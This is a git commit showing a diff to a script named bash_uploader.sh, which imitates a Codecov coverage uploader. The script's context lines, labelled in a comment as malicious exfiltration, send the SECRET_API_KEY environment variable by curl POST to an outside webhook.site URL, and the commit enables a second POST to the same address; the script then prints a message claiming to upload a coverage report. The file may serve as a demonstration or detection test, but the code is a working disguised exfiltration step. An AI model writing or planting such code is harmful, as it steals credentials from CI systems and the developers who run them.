cd86220f6149284e95bd628da1f751dcb13d8f13
danielbmiranda <dani_miranda07@hotmail.com>
2025-06-29 21:31:44 +0100

    update bash_uploader

--- bash_uploader.sh
+++ bash_uploader.sh
@@ -5,7 +5,7 @@ WEBHOOK_URL="https://webhook.site/c0a02d09-b787-4e0b-b088-c5ac2ca2bf38"
 # Malicious exfiltration of environment variable
 curl -X POST -d "SECRET=$SECRET_API_KEY" "$WEBHOOK_URL"
 
-#curl -X POST 'https://webhook.site/c0a02d09-b787-4e0b-b088-c5ac2ca2bf38'   -H 'content-type: application/json'   -d $'{"id": 7, "name": "Jack Daniels", "position": "Assistant"}'
+curl -X POST 'https://webhook.site/c0a02d09-b787-4e0b-b088-c5ac2ca2bf38'   -H 'content-type: application/json'   -d $'{"id": 7, "name": "Jack Daniels", "position": "Assistant"}'
 
 echo "Codecov uploader: uploading coverage report..."
 
